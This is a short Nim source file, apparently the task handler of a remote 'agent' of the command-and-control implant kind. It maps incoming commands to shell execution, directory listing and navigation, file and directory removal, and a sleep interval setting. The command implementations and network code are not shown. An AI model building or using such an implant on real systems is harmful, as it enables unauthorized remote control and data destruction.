import strutils, tables
import ./types 
import ./commands/commands

proc handleTask*(task: Task, config: AgentConfig): TaskResult = 
    
    var taskResult: TaskResult

    let handlers = {
        ExecuteShell: taskShell,
        Sleep: taskSleep,
        GetWorkingDirectory: taskPwd,
        SetWorkingDirectory: taskCd,
        ListDirectory: taskDir,
        RemoveFile: taskRm,
        RemoveDirectory: taskRmdir
    }.toTable

    # Handle task command
    taskResult = handlers[task.command](task)
    echo taskResult.data

    # Handle actions on specific commands
    case task.command:
    of Sleep:         
        if taskResult.status == Completed: 
            config.sleep = parseInt(task.args[0])
    else: 
        discard

    # Return the result
    return taskResult